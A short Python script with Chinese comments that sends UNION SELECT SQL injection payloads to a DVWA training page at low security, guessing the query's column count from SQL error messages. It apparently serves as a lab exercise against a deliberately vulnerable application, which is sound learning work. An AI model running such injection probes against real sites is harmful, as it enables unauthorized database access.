import requests

BASE_URL = "https://f0012fbf98204f57ae3bbf2cb76c8bce--8080.ap-shanghai2.cloudstudio.club/vulnerabilities/sqli/"
PHPSESSID = "123"

cookies = {
    "PHPSESSID": PHPSESSID,
    "security": "low"
}

def test_union_cols(col_num):
    # -1' 让前面查询为空，union select 构造col_num个字段
    fields = ",".join(["1"]*col_num)
    payload = f"-1' union select {fields}#"
    params = {"id": payload}
    resp = requests.get(BASE_URL, params=params, cookies=cookies, timeout=8)
    html = resp.text
    syntax_err = "You have an error in your SQL syntax" in html
    return not syntax_err


if __name__ == "__main__":
    print("使用union select猜列数\n")
    for n in range(1,6):
        ok = test_union_cols(n)
        if ok:
            print(f"[+] {n} 列：匹配成功")
        else:
            print(f"[-] {n} 列：SQL报错，列数不匹配")
    # DVWA预期输出：
    # [-] 1 列：SQL报错
    # [+] 2 列：匹配成功
    # [-] 3 列：SQL报错
